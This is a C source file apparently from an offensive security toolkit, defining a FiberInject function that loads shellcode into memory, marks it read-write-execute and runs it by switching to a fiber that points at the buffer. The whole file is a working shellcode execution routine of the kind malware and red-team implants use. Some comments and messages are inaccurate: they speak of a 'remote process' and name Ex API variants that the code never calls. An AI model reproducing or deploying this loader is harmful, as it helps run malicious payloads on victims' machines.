#include "util.h"

BOOL FiberInject
(
	IN PBYTE Shellcode,
	IN SIZE_T sizeofshell
)
{

	PVOID	MainFiber	= NULL,
			rBuffer		= NULL, 
			FiberShell	= NULL;
	HANDLE	hProcess	= NULL;
	DWORD	dwOldProt	= 0;

	MainFiber = ConvertThreadToFiber(NULL); // Since fibers are created manually we need to make this NULL

	OKAY("[0x%p] Thread Converted to Fibers!", MainFiber);

	rBuffer = VirtualAlloc(NULL, sizeofshell, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Allocate Shell to remote process
	if (rBuffer == NULL)
	{
		PRINT_ERROR("VirtualAllocEx");
		return FALSE;
	}

	OKAY("[0x%p] Allocated buffer with RW permissions!", rBuffer);

	if (!memcpy(rBuffer, Shellcode, sizeofshell))
	{
		PRINT_ERROR("memcpy");
		return FALSE;
	}

	OKAY("[0x%p] Wrote %zu bytes to Remote Process!", rBuffer, sizeofshell);

	if (!VirtualProtect(rBuffer, sizeofshell, PAGE_EXECUTE_READWRITE, &dwOldProt))
	{
		PRINT_ERROR("VirtualProtectEx");
		return FALSE;
	}

	INFO("[0x%p] Changed Protection RW ---> RWX", rBuffer);

	FiberShell = CreateFiber(NULL, (PFIBER_START_ROUTINE)rBuffer, 0);
	if (FiberShell == NULL)
	{
		PRINT_ERROR("CreateFiberEx");
		return FALSE;
	}

	OKAY("[0x%p] Successfully Created Fiber Pointing to our buffer!", FiberShell);

	SwitchToFiber(FiberShell);

	OKAY("Successfully Completed Remote Fiber Injection!");

	DeleteFiber(FiberShell);
	ConvertFiberToThread();

	return TRUE;

}